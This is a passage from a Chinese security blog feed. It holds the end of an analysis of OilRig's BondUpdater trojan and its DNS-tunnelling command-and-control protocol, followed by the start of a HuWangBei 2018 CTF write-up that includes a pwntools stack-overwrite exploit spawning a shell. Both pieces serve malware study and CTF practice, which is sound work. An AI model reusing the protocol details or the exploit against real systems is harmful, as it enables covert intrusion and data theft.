title="2.2、分析关键代码"></a>2.2、分析关键代码</h3><blockquote><p><strong><code>AppPool.ps1</code></strong>代码大致流程：<br>1、在目录<code>&quot;C:\ProgramData\WindowsAppPool&quot;</code>创建<code>lock</code>、<code>qiud</code>两个文件。<br>2、以<code>quid中的内容</code>为<code>文件夹名称</code>在目录”C:\ProgramData\WindowsAppPool”创建文件夹，还创建了<code>“files”</code>文件夹。再在<code>第一个文件夹</code>中创建三个目录，<code>“sendbox”</code>、<code>“receivebox”</code>、<code>“done”</code>。<br>3、构造<code>域名</code>，发起包含<code>初始信标</code>的DNS请求，通知C2<code>开始通信</code>。<br>4、创建任务，<code>定期</code>与C2通信。从C2<code>接收命令</code>，将命令<code>写入到文件</code>，并保存在<code>“receivebox”</code>文件夹中。<br>5、对接收到的命令<code>进行解析</code>，<code>执行命令</code>，然后将<code>结果写入文件</code>，保存在<code>“sendbox”</code>文件夹下，以待后续发往C2.<br>6、将<code>命令执行结果</code>传回C2服务器。</p></blockquote><h4 id="2-2-1、创建lock、quid两个文件"><a href="#2-2-1、创建lock、quid两个文件" class="headerlink" title="2.2.1、创建lock、quid两个文件"></a>2.2.1、创建<code>lock</code>、<code>quid</code>两个文件</h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/7.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;<code>lock文件</code>写入的是当前<code>powershell进程</code>的<code>PID号</code>，powershell脚本会检测<code>当前时间</code>和<code>进程启动时间</code>之差是否<code>超过10分钟</code>，如果超过10分钟就会<code>终止进程</code>并删除<code>lock文件</code>。</p><p>&emsp;&emsp;<code>quid的内容</code>是由<code>GUID</code>(全局唯一标识符)的<code>前八个字符</code>和一个<code>两位的随机整数</code>组成。</p><h4 id="2-2-2、创建files、sendbox、receivebox、done文件夹"><a href="#2-2-2、创建files、sendbox、receivebox、done文件夹" class="headerlink" title="2.2.2、创建files、sendbox、receivebox、done文件夹"></a>2.2.2、创建<code>files</code>、<code>sendbox</code>、<code>receivebox</code>、<code>done</code>文件夹</h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/8.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;<code>files文件夹</code>的作用未从代码中分析出来。<code>sendbox</code>用于存储<code>将要发送到C2的文件</code>，<code>receivebox</code>用于存储从C2接收到的<code>命令文件</code>，<code>done</code>也是用于存储<code>从C2接收到的文件</code>，以便将来使用。</p><h4 id="2-2-3、受害者发送初始信标，开始与C2通信"><a href="#2-2-3、受害者发送初始信标，开始与C2通信" class="headerlink" title="2.2.3、受害者发送初始信标，开始与C2通信"></a>2.2.3、<code>受害者</code>发送<code>初始信标</code>，开始与C2通信</h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/9.png" width="70%" height="70%" alt=""></div><p>参数中的<code>“M”</code>就是<code>操作的类型</code>，是<code>初始信标</code>，表示开始通信，<code>“r”</code>表示按<code>接收数据的格式</code>生成域名。</p><h4 id="2-2-4、定期通信，从C2接收数据。"><a href="#2-2-4、定期通信，从C2接收数据。" class="headerlink" title="2.2.4、定期通信，从C2接收数据。"></a>2.2.4、<code>定期</code>通信，从C2<code>接收数据</code>。</h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/10.png" width="70%" height="70%" alt=""></div><p>每隔<code>50毫秒</code>尝试与C2进行<code>通信一次</code>。</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/11.png" width="70%" height="70%" alt=""></div><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/19.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;<code>dns_request_TXT()</code>功能为构造<code>DNS请求数据包</code>，发起<code>DNS请求</code>，返回<code>响应包数据</code>。这里的dns_request()函数有<strong><code>两种</code></strong>，分别是发送DNS <code>A记录请求</code>和<code>TXT记录请求</code>，下面在分析通信协议的时候会提到。如果木马发送的是<code>DNS A记录请求</code>，木马会从<code>A记录响应包</code>中的<code>address段(ip)</code>提取数据。如果木马发送的是<code>DNS TXT记录请求</code>，木马会从<code>DNS TXT记录响应包</code>中的<code>TXT段(存储数据)</code>提取数据。</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/12.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;<code>C2</code>传输数据到<code>木马</code>总共有<strong><code>两种传输方式</code></strong>，<strong><code>一</code></strong>是通过<code>域名响应ip</code>进行传输，这种是通过发送<code>A记录请求</code>。<strong><code>另一种</code></strong>是通过<code>TXT记录</code>进行传输。上面图片中的代码是对<code>DNS TXT记录响应包</code>进行处理的过程。木马会将接收到的<code>TXT数据</code>以<code>“&gt;”</code>分开，<strong><code>左边</code></strong>的作为<code>指令</code>，<strong><code>右边</code></strong>的作为<code>数据</code>。左边的指令决定木马将会如何处理右边的数据。具体的处理规则会在下一节进行描述。从<code>响应包</code>中解析出的<code>指令</code>和<code>数据</code>，会以<code>文件的形式</code>存储在<code>receivebox文件夹</code>下。以待后续处理。</p><h4 id="2-2-5、解析接收到的文件，执行命令"><a href="#2-2-5、解析接收到的文件，执行命令" class="headerlink" title="2.2.5、解析接收到的文件，执行命令"></a>2.2.5、<code>解析</code>接收到的文件，<code>执行命令</code></h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/13.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;无论是通过<code>A记录</code>进行接收的数据还是通过<code>TXT记录</code>接收的数据，都以<code>文件的形式</code>保存在<code>receivebox文件夹</code>下，文件名以<code>“rcvd”</code>开头。而且会使用相同的<code>文件处理程序</code>。文件处理程序根据<code>文件名</code>的<code>最后一个字符</code>，决定怎么处理以<code>此文件名</code>为名字的<code>文件的内容</code>。</p><h4 id="2-2-6、将执行结果发送回C2服务器"><a href="#2-2-6、将执行结果发送回C2服务器" class="headerlink" title="2.2.6、将执行结果发送回C2服务器"></a>2.2.6、将<code>执行结果</code>发送回<code>C2服务器</code></h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/14.png" width="70%" height="70%" alt=""></div><p><code>&quot;s&quot;</code>是以<code>发送数据的格式</code>生成域名，文件的<code>名称</code>和<code>内容</code>是通过<code>域名</code>来进行传送的。<strong><code>$SSE</code></strong>代表数据块，<strong><code>$TTE</code></strong>代表文件名。下节中的数据格式的介绍中会具体提到这些参数。</p><h3 id="2-3、通信协议分析"><a href="#2-3、通信协议分析" class="headerlink" title="2.3、通信协议分析"></a>2.3、通信协议分析</h3><h4 id="2-3-1、数据格式"><a href="#2-3-1、数据格式" class="headerlink" title="2.3.1、数据格式"></a>2.3.1、数据格式</h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/15.png" width="70%" height="70%" alt=""></div><p><strong><code>发送数据格式：</code></strong><br>&lt;包含分片号、操作类型、GUID前8字符、随机二位整数的字符串&gt;&lt;序号&gt;<1~7个随机字符>C&lt;分片号偏移&gt;&lt;操作类型偏移&gt;T.&lt;数据块&gt;.&lt;文件名&gt;.&#60;C2域名&#62;</1~7个随机字符></p><p><strong><code>接收数据格式：</code></strong><br>&lt;包含分片号、操作类型、GUID前8字符、随机二位整数的字符串&gt;&lt;序号&gt;<1~7个随机字符>C&lt;分片号偏移&gt;&lt;操作类型偏移&gt;T.&#60;C2域名&#62; </1~7个随机字符></p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/16.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;<code>分片号偏移</code>和<code>操作类型偏移</code>都是相对<code>GUID前8字符和随机2位整数</code>组成的字符串的。<strong><code>接收数据格式</code></strong>的<strong><code>第一部分</code></strong>包含<code>分片号</code>、<code>操作类型</code>、<code>GUID前8字符</code>、<code>随机二位整数</code>的字符串，木马首先生成<code>GUID号</code>，然后取<code>GUID号的前8位</code>与一个<code>2位随机整数</code>相连接形成<code>基础字符串</code>，最后将<code>分片号</code>和<code>操作类型</code>随机<code>插入基础字符串</code>。<strong><code>第二部分</code></strong>是1~7位的随机字符串。<strong><code>第三部分</code></strong>就是<code>C</code>和<code>T</code>以及<code>中间的两个数字</code>，<code>第一个数字</code>为<code>操作类型</code>在<code>基础字符串中的偏移</code>，<code>第二个数字</code>为<code>分片号</code>在<code>基础字符串中的偏移</code>。<strong><code>第四部分</code></strong>就是C2域名。<strong><code>发送数据格式</code></strong>和<strong><code>接收数据格式</code></strong>的区别就是多了<code>数据块</code>和<code>文件名</code>。</p><h4 id="2-3-2、DNS请求中包含的操作类型"><a href="#2-3-2、DNS请求中包含的操作类型" class="headerlink" title="2.3.2、DNS请求中包含的操作类型"></a>2.3.2、DNS请求中包含的操作类型</h4><table><thead><tr><th style="text-align:center">操作类型</th><th style="text-align:center">A/TXT</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:center">M</td><td style="text-align:center">A/TXT</td><td style="text-align:left">初始信标</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">A</td><td style="text-align:left">提示C2发送文件名</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">A</td><td style="text-align:left">提示C2发送数据</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">A</td><td style="text-align:left">表明木马正在发送数据，可能是命令执行结果，也可能是受害者机器中的文件</td></tr><tr><td style="text-align:center">W</td><td style="text-align:center">TXT</td><td style="text-align:left">提示C2发送文件名</td></tr><tr><td style="text-align:center">D</td><td style="text-align:center">TXT</td><td style="text-align:left">提示C2发送数据</td></tr><tr><td style="text-align:center">P</td><td style="text-align:center">TXT</td><td style="text-align:left">TXT记录方法失败，通知C2切换到A记录方法</td></tr></tbody></table><p>&emsp;&emsp;将此<code>操作类型</code>包含在生成的<code>子域名</code>中，可以通知C2在<code>响应数据包</code>中使用<code>哪种数据格式</code>。例如：如果操作类型是<strong><code>“W”</code></strong>，C2会发送响应包的<code>TXT段</code>以<code>“S000s”</code>为开头的数据，<code>发送的数据</code>会作为<code>文件名</code>。如果操作类型是<strong><code>“0”</code></strong>，C2会将<code>域名响应ip</code>置为<code>“24.125.[\d].[\d]”</code>,使木马将<code>ip地址的后两段</code>作为<code>文件名</code>进行接收。powershell代码中写了<strong><code>两种记录的DNS请求</code></strong>方法。如下所示：<br><strong><code>A记录请求</code></strong>：</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/17.png" width="70%" height="70%" alt=""></div><p><strong><code>TXT记录请求</code></strong>：</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/18.png" width="70%" height="70%" alt=""></div><h4 id="2-3-3、文件名末尾字符含义"><a href="#2-3-3、文件名末尾字符含义" class="headerlink" title="2.3.3、文件名末尾字符含义"></a>2.3.3、文件名末尾字符含义</h4><table><thead><tr><th style="text-align:center">末尾字符</th><th style="text-align:center">目的</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">执行命令</td><td style="text-align:left">读取文件内容，并当做cmd命令执行。命令的输出保存到以“proc”开头的文件中，并存在“sendbox”文件夹中，等待发送给C2</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">下载文件</td><td style="text-align:left">C2从受害者机器下载文件，木马读取文件内容以获取文件下载路径，将指定的文件复制到“sendbox”文件夹下，以便木马发送到C2</td></tr><tr><td style="text-align:center">其他</td><td style="text-align:center">上传文件</td><td style="text-align:left">C2向受害者机器上传文件，上传的文件将存储在“done”文件夹下，以供将来使用。木马将“200 &lt;&gt; [文件上传路径]”写入“sendbox”文件夹下的文件，以便木马通知C2文件上传成功</td></tr></tbody></table><p>&emsp;&emsp;因为木马从C2<code>接收的数据</code>都是以<code>文件的形式</code>存储在<code>“receivebox”文件夹</code>下的，所以当木马从C2接收完<code>所有的数据</code>后，会执行<code>文件处理程序</code>。文件处理程序会根据<code>以上协议</code>对<code>接收到的数据</code>进行处理。</p><h4 id="2-3-4、原始数据传输过程中的域名解析IP地址及其含义"><a href="#2-3-4、原始数据传输过程中的域名解析IP地址及其含义" class="headerlink" title="2.3.4、原始数据传输过程中的域名解析IP地址及其含义"></a>2.3.4、原始数据传输过程中的域名解析IP地址及其含义</h4><table><thead><tr><th style="text-align:center">IP地址</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:center">24.125.[\d].[\d]</td><td style="text-align:left">在“receivebox”创建文件名为“rcvd [\d][\d]”的文件,以存储将要处理的数据</td></tr><tr><td style="text-align:center">[\d].[\d].[\d].[\d]</td><td style="text-align:left">前三个[\d]作为数据，第四个[\d]指向数据数组最后一个元素的后一个位置</td></tr><tr><td style="text-align:center">1.2.3.[\d]</td><td style="text-align:left">命令木马将数据写入文件，并开始处理数据</td></tr><tr><td style="text-align:center">11.24.237.110</td><td style="text-align:left">杀死木马进程</td></tr></tbody></table><p>&emsp;&emsp;<code>原始数据传输</code>就是通过<strong><code>A记录</code></strong>传输的，数据是放在<code>DNS响应包</code>的<code>address段的ip地址</code>中的。木马发送包含<strong><code>“0”操作类型</code></strong>的DNS请求，C2就会将<code>响应ip地址</code>设为形如<code>“24.125.[\d].[\d]”</code>的地址，并将<code>文件名</code>填充在里面。木马<code>接收到数据</code>会将其与<code>“rcvd”</code>连接在一起，作为<code>文件名</code>，并修改<code>操作类型为“1”</code>。然后木马开始发送包含<strong><code>“1”操作类型</code></strong>的DNS请求，C2就会将<code>响应ip</code>设为形如<code>“[\d].[\d].[\d].[\d]”</code>的地址，并将<code>数据</code>填充在里面。如果数据<code>发送完了</code>，C2就会将<code>响应ip地址</code>设为形如<code>“1.2.3.[\d]”</code>形式的地址。木马接收到后就会将<code>数据</code>存在以前面<code>接收到的文件名</code>为名的文件中，并保存在<code>“reveiveboc”文件夹</code>下。</p><h4 id="2-3-5、其他域名解析IP地址含义"><a href="#2-3-5、其他域名解析IP地址含义" class="headerlink" title="2.3.5、其他域名解析IP地址含义"></a>2.3.5、其他域名解析IP地址含义</h4><table><thead><tr><th style="text-align:center">IP地址</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:center">99.250.250.199</td><td style="text-align:left">响应初始信标，通过新型数据传输协议进行传输数据</td></tr><tr><td style="text-align:center">[quid.substring.(0,2)].2.3.[\d]</td><td style="text-align:left">从响应的ip地址中提取数据</td></tr><tr><td style="text-align:center">253.25.42.87</td><td style="text-align:left">杀死木马进程，删除命令执行结果文件</td></tr></tbody></table><p>&emsp;&emsp;这些<code>IP地址</code>是整个通信过程中除去<code>原始数据</code>传输过程中的<code>域名解析IP地址</code>以外的IP地址。<code>“99.250.250.199”</code>用于表示木马想要与C2<code>开始通信</code>。因为有些数据比较长，所以会<code>分片</code>进行传输，<code>“[quid.substring.(0,2)].2.3.[\d]”</code>的最后一段表示目前传输的分片号，用于判断数据是否完整传输完成。</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/20.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;当<code>文件的字节数</code>大于<code>60字节</code>，就需要<code>多次传输</code>，木马作者设置了<code>数据传输长度</code>的阈值为60。</p><h4 id="2-3-6、新数据传输协议指令含义"><a href="#2-3-6、新数据传输协议指令含义" class="headerlink" title="2.3.6、新数据传输协议指令含义"></a>2.3.6、新数据传输协议指令含义</h4><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:center">N</td><td style="text-align:left">将下一次DNS请求中的操作类型置为“W”</td></tr><tr><td style="text-align:center">S000s</td><td style="text-align:left">在“receivebox”下，将接收到的数据与“rcvd”连接，作为将要存储接收数据的文件的文件名，并将下一次DNS请求中的操作类型置为“D”</td></tr><tr><td style="text-align:center">S</td><td style="text-align:left">将下一查询操作类型置为“D”,并将从响应包接收到的数据进行base64解码</td></tr><tr><td style="text-align:center">E</td><td style="text-align:left">将执行“S”指令后得到的结果写入执行“S000s”指令后生成的文件中</td></tr><tr><td style="text-align:center">C</td><td style="text-align:left">退出循环，取消通信</td></tr></tbody></table><p>&emsp;&emsp;<code>新数据传输协议</code>就是通过<strong><code>TXT记录</code></strong>进行传输数据。当木马发送<strong><code>操作类型为“W”</code></strong>的TXT记录DNS请求，C2就会回复一个<code>包含TXT数据</code>的响应包，<code>响应包</code>中的<code>TXT字段</code>存储了C2发给木马的<code>数据</code>，数据以<code>“&gt;”</code>号分隔开来。如果<code>“&gt;”左边</code>的字符串为<code>“S000s”</code>，木马就将<code>“&gt;”右边</code>的数据与<code>“rcvd”</code>连接，作为将要<code>存储数据</code>的文件的<code>文件名</code>，然后将操作类型置为“D”。然后发送包含<strong><code>操作类型“D”</code></strong>的TXT记录请求，C2会回复TXT数据中<code>“&gt;”左边</code>为<code>“S”</code>的响应包，木马会将<code>“&gt;”右边</code>的数据进行<code>base64解码</code>，并将下一次请求的操作类型置为“D”,再发送包含<strong><code>操作类型“D”</code></strong>的TXT记录请求，直到数据<code>发送完成</code>，然后C2会回复TXT数据中<code>“&gt;”左边</code>为<code>“E”</code>的响应包，木马会将<code>base64解码后的数据</code>写入执行<code>“S000s”指令</code>后生成的<code>文件名</code>的文件中，然后跳出循环。</p><h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p>&emsp;&emsp;通过对<code>此样本</code>的分析，我们可以得出一些<code>DNS隐蔽隧道通信</code>的特征，<code>C2</code>和<code>受控主机</code>都要对对方发过来的数据进行解析，会有一套<code>通信协议</code>。<strong><code>C2</code></strong>会向<strong><code>受控主机</code></strong>发送<code>命令</code>，让受控主机执行，<strong><code>受控主机</code></strong>会向<strong><code>C2</code></strong>发送<code>命令执行结果</code>或者是自己的<code>比较机密的文件</code>。数据可以通过<code>A记录</code>进行传送，<code>数据</code>包含在<code>域名中</code>(受控主机向C2发送数据)或者<code>域名解析IP</code>中(C2向受控主机发送数据)。也可以通过<code>TXT记录</code>进行传送，数据包含在<code>响应包</code>中的<code>TXT字段</code>中。</p><p>&emsp;&emsp;由于C2已经挂了，所以无法再通过流量进行更详细的分析，所以有些细节可能分析的不到位。通过对此样本的分析，我们了解了一种实现<code>DNS隐蔽信道通信</code>的方式以及通信所<code>使用的协议</code>。以后遇到这样的恶意软件就可以类比分析。目前很多<code>APT攻击</code>和其他很多的<code>恶意软件</code>都使用DNS隐蔽信道进行通信，所以对DNS隐蔽信道通信进行检测是一件很重要的事。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、<a href="https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/" target="_blank" rel="noopener">OilRig Uses Updated BONDUPDATER to Target Middle Eastern Government</a></p>]]></content>
      
      <categories>
          
          <category> 恶意软件分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS隐蔽信道通信 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>护网杯2018——WriteUp</title>
      <link href="/2018/10/26/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%E2%80%94%E2%80%94WriteUp/"/>
      <url>/2018/10/26/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%E2%80%94%E2%80%94WriteUp/</url>
      <content type="html"><![CDATA[<blockquote><p>好长时间没做CTF的题了，过段时间要去实习了，得抓紧时间熟悉熟悉以前学的，不然太菜会被鄙视的。<br>这篇文章写得是前段时间刚刚比完的护网杯中的Pwn和Reverse题目的WriteUp。<br>尽量写吧，不一定都会做，记录一下，以后忘了的时候可以快速回忆。<br>还有两门考试，一篇报告，惆怅，考完这两门就没课了。还算有点心理安慰。<br><a id="more"></a></p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h3><h4 id="0x00-file-amp-amp-checksec"><a href="#0x00-file-amp-amp-checksec" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file task_gettingStart_ktQeERc </span><br><span class="line">task_gettingStart_ktQeERc: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8889abb24c5308b96e8483d5dbdd1aa67fffdaa4, stripped</span><br><span class="line">$ checksec task_gettingStart_ktQeERc </span><br><span class="line">[*] &apos;/home/.../Desktop/gettingstart/task_gettingStart_ktQeERc&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h4 id="0x01-运行程序，观察程序功能"><a href="#0x01-运行程序，观察程序功能" class="headerlink" title="0x01 运行程序，观察程序功能"></a>0x01 运行程序，观察程序功能</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./task_gettingStart_ktQeERc </span><br><span class="line">HuWangBei CTF 2018 will be getting start after 139968784619408 seconds...</span><br><span class="line">But Whether it starts depends on you.</span><br><span class="line">csjkomso</span><br><span class="line">Try again!</span><br></pre></td></tr></table></figure><h4 id="0x02-IDA分析"><a href="#0x02-IDA分析" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">double</span> v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">  v8 = <span class="number">1.797693134862316e308</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %lu seconds...\n"</span>, <span class="number">0L</span>L, <span class="number">1.797693134862316e308</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"But Whether it starts depends on you."</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v7 != <span class="number">0x7FFFFFFFFFFFFFFF</span>LL || v8 != <span class="number">0.1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %g seconds...\n"</span>, &amp;buf, v8);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，程序通过read()函数，向栈上的缓冲区复制了0x28字节的数据，然后判断<code>if ( v7 != 0x7FFFFFFFFFFFFFFFLL || v8 != 0.1 )</code>,如果成立，输出<code>Try again!</code>并退出，不成立则执行<code>system(&quot;/bin/sh&quot;)</code>获得shell,所以只要让<code>v7=0x7FFFFFFFFFFFFFFFLL</code>和<code>v8=0.1</code>,则获得shell。我们往上看，buf起始地址在<code>rsp+10h</code>,v7起始地址在<code>rsp+28h</code>,v8起始地址在<code>rsp+30h</code>,缓冲区长度为0x28,所以刚好可以构造输入的数据，覆盖v7和v8。这里的关键是0.1在内存中的形式是什么。我们通过IDA的图形视图可以很方便的找到if判断部分的代码：</p><div align="left"><br>    <img src="http://ww1.sinaimg.cn/large/006fbkm8gy1fwm0kqzi1ij30ei05qdg0.jpg" alt="if判断结构"><br></div><p>双击qword_C10，可以跳转到如下所示位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000000BF6 aTryAgain       db &apos;Try again!&apos;,0       ; DATA XREF: main:loc_A8E↑o</span><br><span class="line">.rodata:0000000000000C01                 align 8</span><br><span class="line">.rodata:0000000000000C08 qword_C08       dq 7FEFFFFFFFFFFFFFh    ; DATA XREF: main+4D↑r</span><br><span class="line">.rodata:0000000000000C10 qword_C10       dq 3FB999999999999Ah    ; DATA XREF: main+EE↑r</span><br></pre></td></tr></table></figure><p>可以看到0.1在内存中的表示为<code>0x3FB999999999999Ah</code>，我们还可以编写一个测试程序，以Hex形式输出0.1的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">0.1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%llx\n"</span>, *(<span class="keyword">long</span> <span class="keyword">long</span>*)&amp;a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h4><p>虽然这道题保护全开，但是对于利用没有阻碍。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote('117.78.40.144', 32671)</span></span><br><span class="line">p = process(<span class="string">"./task_gettingStart_ktQeERc"</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)</span><br><span class="line">payload += p64(<span class="number">0x3FB999999999999A</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>emmmm这道题考察的主要是0.1在内存中的存储形式，具体的可以参考下面的链接。<br><a href="https://math.okstate.edu/people/yqwang/teaching/math5553_spring14/demo/0point1.pdf" target="_blank" rel="noopener">0.1 in double precision</a></p><h3 id="six"><a href="#six" class="headerlink" title="six"></a>six</h3><h4 id="0x00-file-amp-amp-checksec-1"><a href="#0x00-file-amp-amp-checksec-1" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file 